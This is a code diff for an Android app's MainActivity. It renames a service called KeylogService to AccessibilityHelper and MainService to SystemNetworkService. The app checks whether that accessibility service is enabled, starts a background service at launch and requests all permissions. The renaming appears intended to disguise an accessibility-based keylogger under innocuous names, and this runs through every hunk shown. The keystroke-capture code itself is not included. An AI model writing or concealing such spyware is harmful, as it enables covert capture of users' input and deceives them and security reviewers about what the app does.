@@ -18,8 +18,8 @@ import android.util.Log
 import android.view.accessibility.AccessibilityManager
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import com.openaccess.sdk.service.KeylogService
-import com.openaccess.sdk.service.MainService
+import com.openaccess.sdk.service.AccessibilityHelper
+import com.openaccess.sdk.service.SystemNetworkService
 
 class MainActivity : Activity() {
     companion object {
@@ -54,7 +54,7 @@ class MainActivity : Activity() {
                     ctx.contentResolver,
                     Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                 ) ?: ""
-                val ourService = ComponentName(ctx, KeylogService::class.java).flattenToString()
+                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                 enabledServices.contains(ourService) && am.isEnabled
             } catch (_: Exception) {
                 false
@@ -70,7 +70,7 @@ class MainActivity : Activity() {
         Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")
 
         // Step 1: Start background service immediately
-        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
+        try { SystemNetworkService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
 
         // Step 2: Request permissions (activity stays alive for dialog)
         requestAllPerms()
